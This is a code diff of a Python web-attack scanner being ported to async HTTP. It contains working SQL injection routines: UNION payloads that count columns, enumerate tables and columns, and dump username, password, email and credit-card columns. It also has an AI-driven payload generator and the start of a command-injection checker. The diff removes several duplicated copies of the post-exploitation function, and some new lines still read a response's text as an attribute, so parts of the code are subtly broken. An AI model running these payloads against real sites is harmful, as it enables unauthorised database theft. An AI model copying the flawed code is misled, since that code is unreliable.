+        if res and res.status == 200 and "Unknown column" not in await res.text() and "ORDER BY" not in await res.text():
             output.print(f"    [SQLi] Found {i} columns.")
             return i
     output.print("    [SQLi] Could not determine number of columns.")
     return 0
 
-def _get_string_columns(url, method, param_name, original_value, num_columns, form_data, original_query, output, session_cookies):
+async def _get_string_columns(url, method, param_name, original_value, num_columns, form_data, original_query, output, session_cookies):
     """UNION 공격을 위한 문자열 타입 컬럼 인덱스를 찾습니다."""
     output.print(f"    [SQLi] Probing for string columns...")
     string_columns = []
@@ -1944,13 +2019,13 @@ def _get_string_columns(url, method, param_name, original_value, num_columns, fo
         test_payload[i-1] = "'SQLiTEST'"
         payload = f"UNION SELECT {','.join(test_payload)}--"
         test_url, test_data = build_request(url, method, param_name, original_value + payload, form_data, original_query)
-        res, _, _ = _send_http_request(test_url, method=method, data=test_data, output=output, session_cookies=session_cookies)
-        if res and res.status_code == 200 and "SQLiTEST" in res.text:
+        res, _, _ = await _send_async_http_request(test_url, method=method, data=test_data, output=output, session_cookies=session_cookies)
+        if res and res.status == 200 and "SQLiTEST" in await res.text():
             string_columns.append(i)
     output.print(f"    [SQLi] Found string columns at indices: {string_columns}")
     return string_columns
 
-def _extract_db_info(url, method, param_name, original_value, num_columns, string_columns, form_data, original_query, output, session_cookies):
+async def _extract_db_info(url, method, param_name, original_value, num_columns, string_columns, form_data, original_query, output, session_cookies):
     """데이터베이스 버전, 사용자, 데이터베이스 이름을 추출합니다."""
     db_info = {}
     if not string_columns:
@@ -1970,17 +2045,17 @@ def _extract_db_info(url, method, param_name, original_value, num_columns, strin
             union_payload_parts[col_idx - 1] = sql_func
             payload = f"UNION SELECT {','.join(union_payload_parts)}--"
             test_url, test_data = build_request(url, method, param_name, original_value + payload, form_data, original_query)
-            res, _, _ = _send_http_request(test_url, method=method, data=test_data, output=output, session_cookies=session_cookies)
-            if res and res.status_code == 200:
+            res, _, _ = await _send_async_http_request(test_url, method=method, data=test_data, output=output, session_cookies=session_cookies)
+            if res and res.status == 200:
                 # Attempt to extract the value from the response
-                match = re.search(r'(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b|\b\w+@\w+\.\w+\b|\b\w+\b)', res.text) # Generic regex for IP, email, or word
+                match = re.search(r'(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b|\b\w+@\w+\.\w+\b|\b\w+\b)', await res.text()) # Generic regex for IP, email, or word
                 if match:
                     db_info[info_name] = match.group(0)
                     output.print(f"    [SQLi] Extracted {info_name}: {db_info[info_name]}")
                     break # Move to next info_name if found
     return db_info
 
-def _dump_tables(url, method, param_name, original_value, num_columns, string_columns, db_name, form_data, original_query, output, session_cookies):
+async def _dump_tables(url, method, param_name, original_value, num_columns, string_columns, db_name, form_data, original_query, output, session_cookies):
     """데이터베이스의 테이블 목록을 덤프합니다."""
     tables = []
     if not string_columns: return tables
@@ -1993,9 +2068,9 @@ def _dump_tables(url, method, param_name, original_value, num_columns, string_co
         union_payload_parts[col_idx - 1] = "group_concat(table_name)"
         payload = f"UNION SELECT {','.join(union_payload_parts)} FROM information_schema.tables WHERE table_schema='{db_name}'--"
         test_url, test_data = build_request(url, method, param_name, original_value + payload, form_data, original_query)
-        res, _, _ = _send_http_request(test_url, method=method, data=test_data, output=output, session_cookies=session_cookies)
-        if res and res.status_code == 200:
-            match = re.search(r'(\b\w+(?:,\w+)*\b)', res.text) # Match comma-separated words
+        res, _, _ = await _send_async_http_request(test_url, method=method, data=test_data, output=output, session_cookies=session_cookies)
+        if res and res.status == 200:
+            match = re.search(r'(\b\w+(?:,\w+)*\b)', await res.text()) # Match comma-separated words
             if match:
                 tables = match.group(0).split(',')
                 output.print(f"    [SQLi] Found tables: {tables}")
@@ -2005,7 +2080,7 @@ def _dump_tables(url, method, param_name, original_value, num_columns, string_co
     output.print("    [SQLi] Could not dump tables using information_schema.")
     return tables
 
-def _dump_columns(url, method, param_name, original_value, num_columns, string_columns, db_name, table_name, form_data, original_query, output, session_cookies):
+async def _dump_columns(url, method, param_name, original_value, num_columns, string_columns, db_name, table_name, form_data, original_query, output, session_cookies):
     """특정 테이블의 컬럼 목록을 덤프합니다."""
     columns = []
     if not string_columns: return columns
@@ -2017,9 +2092,9 @@ def _dump_columns(url, method, param_name, original_value, num_columns, string_c
         union_payload_parts[col_idx - 1] = "group_concat(column_name)"
         payload = f"UNION SELECT {','.join(union_payload_parts)} FROM information_schema.columns WHERE table_schema='{db_name}' AND table_name='{table_name}'--"
         test_url, test_data = build_request(url, method, param_name, original_value + payload, form_data, original_query)
-        res, _, _ = _send_http_request(test_url, method=method, data=test_data, output=output, session_cookies=session_cookies)
-        if res and res.status_code == 200:
-            match = re.search(r'(\b\w+(?:,\w+)*\b)', res.text)
+        res, _, _ = await _send_async_http_request(test_url, method=method, data=test_data, output=output, session_cookies=session_cookies)
+        if res and res.status == 200:
+            match = re.search(r'(\b\w+(?:,\w+)*\b)', await res.text())
             if match:
                 columns = match.group(0).split(',')
                 output.print(f"    [SQLi] Found columns for '{table_name}': {columns}")
@@ -2027,7 +2102,7 @@ def _dump_columns(url, method, param_name, original_value, num_columns, string_c
     output.print(f"    [SQLi] Could not dump columns for table '{table_name}'.")
     return columns
 
-def _dump_data(url, method, param_name, original_value, num_columns, string_columns, table_name, columns, form_data, original_query, output, session_cookies):
+async def _dump_data(url, method, param_name, original_value, num_columns, string_columns, table_name, columns, form_data, original_query, output, session_cookies):
     """특정 테이블의 데이터를 덤프합니다."""
     data = []
     if not string_columns or not columns: return data
@@ -2042,11 +2117,11 @@ def _dump_data(url, method, param_name, original_value, num_columns, string_colu
         union_payload_parts[col_idx - 1] = columns_to_dump
         payload = f"UNION SELECT {','.join(union_payload_parts)} FROM {table_name}--"
         test_url, test_data = build_request(url, method, param_name, original_value + payload, form_data, original_query)
-        res, _, _ = _send_http_request(test_url, method=method, data=test_data, output=output, session_cookies=session_cookies)
-        if res and res.status_code == 200:
+        res, _, _ = await _send_async_http_request(test_url, method=method, data=test_data, output=output, session_cookies=session_cookies)
+        if res and res.status == 200:
             # Extract all lines that look like dumped data
             # This regex is very generic and might need refinement based on actual output
-            dump_matches = re.findall(r'(\b\w+(?: \| \w+)*\b)', res.text)
+            dump_matches = re.findall(r'(\b\w+(?: \| \w+)*\b)', await res.text())
             if dump_matches:
                 data = dump_matches
                 output.print(f"    [SQLi] Dumped data from '{table_name}':\n{json.dumps(data, indent=2)}")
@@ -2109,7 +2184,7 @@ def build_request(base_url, method, param_name, payload, original_form_data=None
 
 # --- 6. SQL 인젝션 (2차 공격 포함) ---
 
-def check_sql_injection(target, form_to_test, output, tech, report, session_cookies=None, ai_enabled=False):
+async def check_sql_injection(target, form_to_test, output, tech, report, session_cookies=None, ai_enabled=False):
     output.print(f"\n[+] Starting Ultimate SQL Injection Scan on {target}...")
 
     sql_probes = [
@@ -2705,22 +2780,22 @@ def check_sql_injection(target, form_to_test, output, tech, report, session_cook
         "unclosed character string", "odbc driver"
     ]
 
-    def test_sqli(url, method, param_name, original_value, form_data=None, original_query=None, use_hpp=False):
+    async def test_sqli(url, method, param_name, original_value, form_data=None, original_query=None, use_hpp=False):
         # Error-based check
         for p in error_payloads:
             for encoded_p in get_encoded_payloads(p):
                 test_url, test_data = build_request(url, method, param_name, original_value + encoded_p, form_data, original_query, use_hpp=use_hpp)
-                res, request_details, response_details = _send_http_request(test_url, method=method, data=test_data, output=output, session_cookies=session_cookies)
-                if res and any(e in res.text.lower() for e in db_errors):
+                res, request_details, response_details = await _send_async_http_request(test_url, method=method, data=test_data, output=output, session_cookies=session_cookies)
+                if res and any(e in (await res.text()).lower() for e in db_errors):
                     output.print(f"  [CRITICAL] Error-Based SQLi confirmed in {method.upper()} param '{param_name}' with payload: {encoded_p}")
                     # AI-driven post-exploitation could be added here
-                    return post_exploit_sqli(url, method, param_name, original_value, encoded_p, report, output, session_cookies, form_data, original_query, res.text, request_details, response_details)
+                    return await post_exploit_sqli(url, method, param_name, original_value, encoded_p, report, output, session_cookies, form_data, original_query, await res.text(), request_details, response_details)
 
         # Time-based blind check
         for p in time_based_payloads:
             start_time = time.time()
             test_url, test_data = build_request(url, method, param_name, original_value + p, form_data, original_query, use_hpp=use_hpp)
-            _, request_details, response_details = _send_http_request(test_url, method=method, data=test_data, timeout=8, output=output, session_cookies=session_cookies)
+            _, request_details, response_details = await _send_async_http_request(test_url, method=method, data=test_data, timeout=8, output=output, session_cookies=session_cookies)
             end_time = time.time()
             if (end_time - start_time) > 4.5 and (end_time - start_time) < 7.5:
                 output.print(f"  [CRITICAL] Time-Based Blind SQLi confirmed in {method.upper()} param '{param_name}' with payload: {p}")
@@ -2732,22 +2807,22 @@ def check_sql_injection(target, form_to_test, output, tech, report, session_cook
         if ai_enabled:
             output.print("  [AI MODE] Initial SQLi checks failed. Generating dynamic payloads...")
             # We need a response snippet to give the AI context
-            res_for_ai, request_details, response_details = _send_http_request(url, method=method, data=form_data, output=output, session_cookies=session_cookies)
-            response_snippet = res_for_ai.text[:500] if res_for_ai else "No response."
+            res_for_ai, request_details, response_details = await _send_async_http_request(url, method=method, data=form_data, output=output, session_cookies=session_cookies)
+            response_snippet = (await res_for_ai.text())[:500] if res_for_ai else "No response."
             
             ai_payloads = ai_generate_dynamic_payloads("SQL Injection", "' OR 1=1--", response_snippet, output)
             for p in ai_payloads:
                 # Test AI-generated payloads (both error-based and time-based)
                 # Error-based
                 test_url, test_data = build_request(url, method, param_name, original_value + p, form_data, original_query, use_hpp=use_hpp)
-                res, req_details, res_details = _send_http_request(test_url, method=method, data=test_data, output=output, session_cookies=session_cookies)
-                if res and any(e in res.text.lower() for e in db_errors):
+                res, req_details, res_details = await _send_async_http_request(test_url, method=method, data=test_data, output=output, session_cookies=session_cookies)
+                if res and any(e in (await res.text()).lower() for e in db_errors):
                     output.print(f"  [CRITICAL] AI-Generated Error-Based SQLi confirmed with payload: {p}")
-                    return post_exploit_sqli(url, method, param_name, original_value, p, report, output, session_cookies, form_data, original_query, res.text, req_details, res_details)
+                    return await post_exploit_sqli(url, method, param_name, original_value, p, report, output, session_cookies, form_data, original_query, await res.text(), req_details, res_details)
                 
                 # Time-based
                 start_time = time.time()
-                _, req_details, res_details = _send_http_request(test_url, method=method, data=test_data, timeout=8, output=output, session_cookies=session_cookies)
+                _, req_details, res_details = await _send_async_http_request(test_url, method=method, data=test_data, timeout=8, output=output, session_cookies=session_cookies)
                 end_time = time.time()
                 if (end_time - start_time) > 4.5 and (end_time - start_time) < 7.5:
                     output.print(f"  [CRITICAL] AI-Generated Time-Based SQLi confirmed with payload: {p}")
@@ -2798,43 +2873,17 @@ def check_sql_injection(target, form_to_test, output, tech, report, session_cook
     for point in attack_points:
         output.print(f"  [*] Testing SQLi on {point['method'].upper()} parameter '{point['param']}' at {point['url']}")
         # Test with and without HPP
-        if test_sqli(point['url'], point['method'], point['param'], point['value'], point['form_data'], point['original_query'], use_hpp=False):
+        if await test_sqli(point['url'], point['method'], point['param'], point['value'], point['form_data'], point['original_query'], use_hpp=False):
             return # Vulnerability found, stop
-        if test_sqli(point['url'], point['method'], point['param'], point['value'], point['form_data'], point['original_query'], use_hpp=True):
+        if await test_sqli(point['url'], point['method'], point['param'], point['value'], point['form_data'], point['original_query'], use_hpp=True):
             return # Vulnerability found, stop
     
     output.print(f"  [INFO] No SQL Injection detected for target {target} after all checks.")
     report.add_check(f"SQLi Check on {target}", "No vulnerability found")
 
-def build_request(base_url, method, param_name, payload, original_form_data=None, original_url_query=None, use_hpp=False):
-    """향상된 요청 빌더 (HPP 지원)"""
-    hpp_payload = f"{payload}&{param_name}={get_random_string(5)}" if use_hpp else payload
-    
-    if method == 'get':
-        parsed_url = urlparse(base_url)
-        query_params = []
-        if original_url_query:
-            params = original_url_query.split('&')
-            param_found_and_replaced = False
-            for p in params:
-                key, _, val = p.partition('=')
-                if key == param_name:
-                    query_params.append(f"{key}={quote(hpp_payload)}")
-                    param_found_and_replaced = True
-                else:
-                    query_params.append(p)
-            if not param_found_and_replaced:
-                query_params.append(f"{param_name}={quote(hpp_payload)}")
-        else:
-            query_params.append(f"{param_name}={quote(hpp_payload)}")
-        test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{'&'.join(query_params)}"
-        return test_url, None
-    else: # POST
-        post_data = original_form_data.copy() if original_form_data else {}
-        post_data[param_name] = hpp_payload
-        return base_url, post_data
+# --- 6. SQL 인젝션 (2차 공격 포함) ---
 
-def post_exploit_sqli(url, method, param_name, original_value, vuln_payload, report, output, session_cookies, form_data, original_query, initial_evidence):
+async def post_exploit_sqli(url, method, param_name, original_value, vuln_payload, report, output, session_cookies, form_data, original_query, initial_evidence, request_details, response_details):
     output.print("  [+] SQLi Confirmed! Starting Post-Exploitation...")
     evidence = f"Initial vulnerable response snippet:\n---\n{initial_evidence[:250]}\n---\n\n"
     
@@ -2849,117 +2898,18 @@ def post_exploit_sqli(url, method, param_name, original_value, vuln_payload, rep
 
     for info_name, p in info_payloads.items():
         test_url, test_data = build_request(url, method, param_name, original_value + p, form_data, original_query)
-        res = _send_http_request(test_url, method=method, data=test_data, output=output, session_cookies=session_cookies)
-        if res and res.text:
-            # Try to find the injected value more robustly
-            # Look for the payload content in the response, assuming it's reflected
-            # This regex is still generic, but we'll try to refine it if needed
-            match = re.search(r'(\b\w+\b(?:\s+\w+)*\s+version|\b\w+\b(?:\s+\w+)*\s+database|\b\w+\b(?:\s+\w+)*\s+user)', res.text, re.IGNORECASE)
-            if match:
-                # Attempt to extract the actual value near the matched keyword
-                # This is a heuristic and might need further refinement based on actual target responses
-                snippet_start = max(0, res.text.find(match.group(0)) - 50)
-                snippet_end = min(len(res.text), res.text.find(match.group(0)) + len(match.group(0)) + 100)
-                snippet = res.text[snippet_start:snippet_end]
-                
-                # More specific regex for common patterns
-                version_match = re.search(r'version\s*:\s*([\w\d\.\-]+)', snippet, re.IGNORECASE)
-                db_match = re.search(r'database\s*:\s*([\w\d\.\-]+)', snippet, re.IGNORECASE)
-                user_match = re.search(r'user\s*:\s*([\w\d\.\-]+)', snippet, re.IGNORECASE)
-
-                if info_name == "Version" and version_match:
-                    info_value = version_match.group(1).strip()
-                elif info_name == "Database" and db_match:
-                    info_value = db_match.group(1).strip()
-                elif info_name == "User" and user_match:
-                    info_value = user_match.group(1).strip()
-                else:
-                    # Fallback to a more generic extraction if specific patterns fail
-                    # This might capture more than just the value, but it's better than nothing
-                    generic_match = re.search(r'[\'"]?([\w\d\.\-]+)[\'"]?', snippet)
-                    info_value = generic_match.group(1).strip() if generic_match else None
-
-                if info_value:
-                    output.print(f"    [SUCCESS] Leaked {info_name}: {info_value}")
-                    extracted_info[info_name] = info_value
-                    evidence += f"Leaked {info_name}: {info_value}\n"
-    
-    # Attempt to enumerate tables
-    table_payloads = [
-        "UNION SELECT NULL,group_concat(table_name),NULL FROM information_schema.tables WHERE table_schema=database()--", # MySQL/PostgreSQL
-        "UNION SELECT NULL,name,NULL FROM sys.tables WHERE is_ms_shipped = 0--", # MSSQL
-        "UNION SELECT NULL,table_name,NULL FROM all_tables WHERE owner = user()--", # Oracle
-    ]
-    for p in table_payloads:
-        test_url, test_data = build_request(url, method, param_name, original_value + p, form_data, original_query)
-        res = _send_http_request(test_url, method=method, data=test_data, output=output, session_cookies=session_cookies)
-        if res and res.text:
-            # Look for common table name patterns in the response
-            table_match = re.search(r'(\b\w+(?:,\s*\w+)*\b)', res.text) # Generic word list
-            if table_match:
-                tables = table_match.group(1).strip()
-                if tables and "information_schema" not in tables.lower() and "sys.tables" not in tables.lower():
-                    output.print(f"    [SUCCESS] Leaked Tables: {tables}")
-                    extracted_info["Tables"] = tables
-                    evidence += f"Leaked Tables: {tables}\n"
-                    break # Stop after first successful table enumeration
-
-    # Attempt to enumerate columns for a common table (e.g., 'users')
-    if "Tables" in extracted_info and any(t in extracted_info["Tables"].lower() for t in ["users", "user", "admin", "admins"]):
-        target_table = next((t for t in ["users", "user", "admin", "admins"] if t in extracted_info["Tables"].lower()), None)
-        if target_table:
-            column_payloads = [
-                f"UNION SELECT NULL,group_concat(column_name),NULL FROM information_schema.columns WHERE table_schema=database() AND table_name='{target_table}'--", # MySQL/PostgreSQL
-                f"UNION SELECT NULL,name,NULL FROM sys.columns WHERE object_id = OBJECT_ID('{target_table}')--", # MSSQL
-                f"UNION SELECT NULL,column_name,NULL FROM all_tab_columns WHERE owner = user() AND table_name='{target_table.upper()}'--", # Oracle
-            ]
-            for p in column_payloads:
-                test_url, test_data = build_request(url, method, param_name, original_value + p, form_data, original_query)
-                res, request_details, response_details = _send_http_request(test_url, method=method, data=test_data, output=output, session_cookies=session_cookies)
-                if res and res.text:
-                    column_match = re.search(r'(\b\w+(?:,\s*\w+)*\b)', res.text)
-                    if column_match:
-                        columns = column_match.group(1).strip()
-                        if columns and "information_schema" not in columns.lower() and "sys.columns" not in columns.lower():
-                            output.print(f"    [SUCCESS] Leaked Columns for '{target_table}': {columns}")
-                            extracted_info[f"Columns for {target_table}"] = columns
-                            evidence += f"Leaked Columns for '{target_table}': {columns}\n"
-                            break # Stop after first successful column enumeration
-
-    report.add_finding("Error-Based SQL Injection", "Critical", url, param_name, vuln_payload, 
-                       "The application returned a database error message, indicating a vulnerability to SQL Injection. Post-exploitation attempts successfully extracted database information.", 
-                       "Use parameterized queries or prepared statements for all database interactions. Implement strict input validation and sanitize all user-supplied data. Ensure verbose error messages are disabled in production environments.", 
-                       evidence, method=method,
-                       future_vector="Full database schema and data exfiltration may be possible. Recommend manual testing with sqlmap or similar tools to dump sensitive data.")
-    return True
-
-def post_exploit_sqli(url, method, param_name, original_value, vuln_payload, report, output, session_cookies, form_data, original_query, initial_evidence, request_details, response_details):
-    output.print("  [+] SQLi Confirmed! Starting Post-Exploitation...")
-    evidence = f"Initial vulnerable response snippet:\n---\n{initial_evidence[:250]}\n---\n\n"
-    
-    # PoC: 데이터베이스 정보 추출 시도
-    info_payloads = {
-        "Version": "UNION SELECT NULL,@@version,NULL--",
-        "Database": "UNION SELECT NULL,database(),NULL--",
-        "User": "UNION SELECT NULL,user(),NULL--"
-    }
-    
-    extracted_info = {}
-
-    for info_name, p in info_payloads.items():
-        test_url, test_data = build_request(url, method, param_name, original_value + p, form_data, original_query)
-        res_info, req_det_info, resp_det_info = _send_http_request(test_url, method=method, data=test_data, output=output, session_cookies=session_cookies)
+        res_info, req_det_info, resp_det_info = await _send_async_http_request(test_url, method=method, data=test_data, output=output, session_cookies=session_cookies)
         if res_info and res_info.text:
             # Try to find the injected value more robustly
             # Look for the payload content in the response, assuming it's reflected
             # This regex is still generic, but we'll try to refine it if needed
-            match = re.search(r'(\b\w+\b(?:\s+\w+)*\s+version|\b\w+\b(?:\s+\w+)*\s+database|\b\w+\b(?:\s+\w+)*\s+user)', res_info.text, re.IGNORECASE)
+            match = re.search(r'(\b\w+\b(?:\s+\w+)*\s+version|\b\w+\b(?:\s+\w+)*\s+database|\b\w+\b(?:\s+\w+)*\s+user)', await res_info.text(), re.IGNORECASE)
             if match:
                 # Attempt to extract the actual value near the matched keyword
                 # This is a heuristic and might need further refinement based on actual target responses
-                snippet_start = max(0, res_info.text.find(match.group(0)) - 50)
-                snippet_end = min(len(res_info.text), res_info.text.find(match.group(0)) + len(match.group(0)) + 100)
-                snippet = res_info.text[snippet_start:snippet_end]
+                snippet_start = max(0, (await res_info.text()).find(match.group(0)) - 50)
+                snippet_end = min(len(await res_info.text()), (await res_info.text()).find(match.group(0)) + len(match.group(0)) + 100)
+                snippet = (await res_info.text())[snippet_start:snippet_end]
                 
                 # More specific regex for common patterns
                 version_match = re.search(r'version\s*:\s*([\w\d\.\-]+)', snippet, re.IGNORECASE)
@@ -2991,10 +2941,10 @@ def post_exploit_sqli(url, method, param_name, original_value, vuln_payload, rep
     ]
     for p in table_payloads:
         test_url, test_data = build_request(url, method, param_name, original_value + p, form_data, original_query)
-        res_table, req_det_table, resp_det_table = _send_http_request(test_url, method=method, data=test_data, output=output, session_cookies=session_cookies)
+        res_table, req_det_table, resp_det_table = await _send_async_http_request(test_url, method=method, data=test_data, output=output, session_cookies=session_cookies)
         if res_table and res_table.text:
             # Look for common table name patterns in the response
-            table_match = re.search(r'(\b\w+(?:,\s*\w+)*\b)', res_table.text) # Generic word list
+            table_match = re.search(r'(\b\w+(?:,\s*\w+)*\b)', await res_table.text()) # Generic word list
             if table_match:
                 tables = table_match.group(1).strip()
                 if tables and "information_schema" not in tables.lower() and "sys.tables" not in tables.lower():
@@ -3014,9 +2964,9 @@ def post_exploit_sqli(url, method, param_name, original_value, vuln_payload, rep
             ]
             for p in column_payloads:
                 test_url, test_data = build_request(url, method, param_name, original_value + p, form_data, original_query)
-                res_column, req_det_column, resp_det_column = _send_http_request(test_url, method=method, data=test_data, output=output, session_cookies=session_cookies)
+                res_column, req_det_column, resp_det_column = await _send_async_http_request(test_url, method=method, data=test_data, output=output, session_cookies=session_cookies)
                 if res_column and res_column.text:
-                    column_match = re.search(r'(\b\w+(?:,\s*\w+)*\b)', res_column.text)
+                    column_match = re.search(r'(\b\w+(?:,\s*\w+)*\b)', await res_column.text())
                     if column_match:
                         columns = column_match.group(1).strip()
                         if columns and "information_schema" not in columns.lower() and "sys.columns" not in columns.lower():
@@ -3029,121 +2979,9 @@ def post_exploit_sqli(url, method, param_name, original_value, vuln_payload, rep
                             if sensitive_columns:
                                 dump_payload = f"UNION SELECT NULL,group_concat({sensitive_columns[0]}),NULL FROM {target_table}--"
                                 test_url, test_data = build_request(url, method, param_name, original_value + dump_payload, form_data, original_query)
-                                res_dump, req_det_dump, resp_det_dump = _send_http_request(test_url, method=method, data=test_data, output=output, session_cookies=session_cookies)
+                                res_dump, req_det_dump, resp_det_dump = await _send_async_http_request(test_url, method=method, data=test_data, output=output, session_cookies=session_cookies)
                                 if res_dump and res_dump.text:
-                                    dump_match = re.search(r'(\b\w+(?:,\s*\w+)*\b)', res_dump.text)
-                                    if dump_match:
-                                        dumped_data = dump_match.group(1).strip()
-                                        output.print(f"    [CRITICAL] Leaked Data from '{target_table}.{sensitive_columns[0]}': {dumped_data[:100]}...")
-                                        extracted_info[f"Data from {target_table}.{sensitive_columns[0]}"] = dumped_data
-                                        evidence += f"Leaked Data from '{target_table}.{sensitive_columns[0]}': {dumped_data[:500]}...\n"
-                            break # Stop after first successful column enumeration
-
-    report.add_finding("Error-Based SQL Injection", "Critical", url, param_name, vuln_payload, 
-                       "The application returned a database error message, indicating a vulnerability to SQL Injection. Post-exploitation attempts successfully extracted database information.", 
-                       "Use parameterized queries or prepared statements for all database interactions. Implement strict input validation and sanitize all user-supplied data. Ensure verbose error messages are disabled in production environments.", 
-                       evidence, method=method, request_details=request_details, response_details=response_details,
-                       future_vector="Full database schema and data exfiltration may be possible. Recommend manual testing with sqlmap or similar tools to dump sensitive data.")
-    return True
-def post_exploit_sqli(url, method, param_name, original_value, vuln_payload, report, output, session_cookies, form_data, original_query, initial_evidence, request_details, response_details):
-    output.print("  [+] SQLi Confirmed! Starting Post-Exploitation...")
-    evidence = f"Initial vulnerable response snippet:\n---\n{initial_evidence[:250]}\n---\n\n"
-    
-    # PoC: 데이터베이스 정보 추출 시도
-    info_payloads = {
-        "Version": "UNION SELECT NULL,@@version,NULL--",
-        "Database": "UNION SELECT NULL,database(),NULL--",
-        "User": "UNION SELECT NULL,user(),NULL--"
-    }
-    
-    extracted_info = {}
-
-    for info_name, p in info_payloads.items():
-        test_url, test_data = build_request(url, method, param_name, original_value + p, form_data, original_query)
-        res_info, req_det_info, resp_det_info = _send_http_request(test_url, method=method, data=test_data, output=output, session_cookies=session_cookies)
-        if res_info and res_info.text:
-            # Try to find the injected value more robustly
-            # Look for the payload content in the response, assuming it's reflected
-            # This regex is still generic, but we'll try to refine it if needed
-            match = re.search(r'(\b\w+\b(?:\s+\w+)*\s+version|\b\w+\b(?:\s+\w+)*\s+database|\b\w+\b(?:\s+\w+)*\s+user)', res_info.text, re.IGNORECASE)
-            if match:
-                # Attempt to extract the actual value near the matched keyword
-                # This is a heuristic and might need further refinement based on actual target responses
-                snippet_start = max(0, res_info.text.find(match.group(0)) - 50)
-                snippet_end = min(len(res_info.text), res_info.text.find(match.group(0)) + len(match.group(0)) + 100)
-                snippet = res_info.text[snippet_start:snippet_end]
-                
-                # More specific regex for common patterns
-                version_match = re.search(r'version\s*:\s*([\w\d\.\-]+)', snippet, re.IGNORECASE)
-                db_match = re.search(r'database\s*:\s*([\w\d\.\-]+)', snippet, re.IGNORECASE)
-                user_match = re.search(r'user\s*:\s*([\w\d\.\-]+)', snippet, re.IGNORECASE)
-
-                if info_name == "Version" and version_match:
-                    info_value = version_match.group(1).strip()
-                elif info_name == "Database" and db_match:
-                    info_value = db_match.group(1).strip()
-                elif info_name == "User" and user_match:
-                    info_value = user_match.group(1).strip()
-                else:
-                    # Fallback to a more generic extraction if specific patterns fail
-                    # This might capture more than just the value, but it's better than nothing
-                    generic_match = re.search(r'[\'"]?([\w\d\.\-]+)[\'"]?', snippet)
-                    info_value = generic_match.group(1).strip() if generic_match else None
-
-                if info_value:
-                    output.print(f"    [SUCCESS] Leaked {info_name}: {info_value}")
-                    extracted_info[info_name] = info_value
-                    evidence += f"Leaked {info_name}: {info_value}\n"
-    
-    # Attempt to enumerate tables
-    table_payloads = [
-        "UNION SELECT NULL,group_concat(table_name),NULL FROM information_schema.tables WHERE table_schema=database()--", # MySQL/PostgreSQL
-        "UNION SELECT NULL,name,NULL FROM sys.tables WHERE is_ms_shipped = 0--", # MSSQL
-        "UNION SELECT NULL,table_name,NULL FROM all_tables WHERE owner = user()--", # Oracle
-    ]
-    for p in table_payloads:
-        test_url, test_data = build_request(url, method, param_name, original_value + p, form_data, original_query)
-        res_table, req_det_table, resp_det_table = _send_http_request(test_url, method=method, data=test_data, output=output, session_cookies=session_cookies)
-        if res_table and res_table.text:
-            # Look for common table name patterns in the response
-            table_match = re.search(r'(\b\w+(?:,\s*\w+)*\b)', res_table.text) # Generic word list
-            if table_match:
-                tables = table_match.group(1).strip()
-                if tables and "information_schema" not in tables.lower() and "sys.tables" not in tables.lower():
-                    output.print(f"    [SUCCESS] Leaked Tables: {tables}")
-                    extracted_info["Tables"] = tables
-                    evidence += f"Leaked Tables: {tables}\n"
-                    break # Stop after first successful table enumeration
-
-    # Attempt to enumerate columns for a common table (e.g., 'users')
-    if "Tables" in extracted_info and any(t in extracted_info["Tables"].lower() for t in ["users", "user", "admin", "admins"]):
-        target_table = next((t for t in ["users", "user", "admin", "admins"] if t in extracted_info["Tables"].lower()), None)
-        if target_table:
-            column_payloads = [
-                f"UNION SELECT NULL,group_concat(column_name),NULL FROM information_schema.columns WHERE table_schema=database() AND table_name='{target_table}'--", # MySQL/PostgreSQL
-                f"UNION SELECT NULL,name,NULL FROM sys.columns WHERE object_id = OBJECT_ID('{target_table}')--", # MSSQL
-                f"UNION SELECT NULL,column_name,NULL FROM all_tab_columns WHERE owner = user() AND table_name='{target_table.upper()}'--", # Oracle
-            ]
-            for p in column_payloads:
-                test_url, test_data = build_request(url, method, param_name, original_value + p, form_data, original_query)
-                res_column, req_det_column, resp_det_column = _send_http_request(test_url, method=method, data=test_data, output=output, session_cookies=session_cookies)
-                if res_column and res_column.text:
-                    column_match = re.search(r'(\b\w+(?:,\s*\w+)*\b)', res_column.text)
-                    if column_match:
-                        columns = column_match.group(1).strip()
-                        if columns and "information_schema" not in columns.lower() and "sys.columns" not in columns.lower():
-                            output.print(f"    [SUCCESS] Leaked Columns for '{target_table}': {columns}")
-                            extracted_info[f"Columns for {target_table}"] = columns
-                            evidence += f"Leaked Columns for '{target_table}': {columns}\n"
-                            
-                            # Attempt to dump data from sensitive columns
-                            sensitive_columns = [c for c in ["username", "password", "email", "credit_card"] if c in columns.lower()]
-                            if sensitive_columns:
-                                dump_payload = f"UNION SELECT NULL,group_concat({sensitive_columns[0]}),NULL FROM {target_table}--"
-                                test_url, test_data = build_request(url, method, param_name, original_value + dump_payload, form_data, original_query)
-                                res_dump, req_det_dump, resp_det_dump = _send_http_request(test_url, method=method, data=test_data, output=output, session_cookies=session_cookies)
-                                if res_dump and res_dump.text:
-                                    dump_match = re.search(r'(\b\w+(?:,\s*\w+)*\b)', res_dump.text)
+                                    dump_match = re.search(r'(\b\w+(?:,\s*\w+)*\b)', await res_dump.text())
                                     if dump_match:
                                         dumped_data = dump_match.group(1).strip()
                                         output.print(f"    [CRITICAL] Leaked Data from '{target_table}.{sensitive_columns[0]}': {dumped_data[:100]}...")
@@ -3158,7 +2996,7 @@ def post_exploit_sqli(url, method, param_name, original_value, vuln_payload, rep
                        future_vector="Full database schema and data exfiltration may be possible. Recommend manual testing with sqlmap or similar tools to dump sensitive data.")
     return True
 
-def check_command_injection(target, form_to_test, output, tech, report, session_cookies=None, ai_enabled=False):
+async def check_command_injection(target, form_to_test, output, tech, report, session_cookies=None, ai_enabled=False):
     output.print("\n[+] Starting Ultimate Command Injection Scan...")
     marker = f"CMD{get_random_string(4)}"
     rand_str = get_random_string()
@@ -3182,20 +3020,20 @@ def check_command_injection(target, form_to_test, output, tech, report, session_
         f"| groovy -e '\"echo {marker}\".execute()'"
     ]
 
-    def test_and_exploit_cmd(url, method, param_name, original_value, form_data=None, original_query=None):
+    async def test_and_exploit_cmd(url, method, param_name, original_value, form_data=None, original_query=None):
         # 1. Test for basic reflection
         for p in payloads:
             if f"echo {marker}" not in p: continue # Only use echo payloads for initial detection
             
             for encoded_p in get_encoded_payloads(p):
                 test_url, test_data = build_request(url, method, param_name, original_value + encoded_p, form_data, original_query)
-                res, request_details, response_details = _send_http_request(test_url, method=method, data=test_data, output=output, session_cookies=session_cookies)
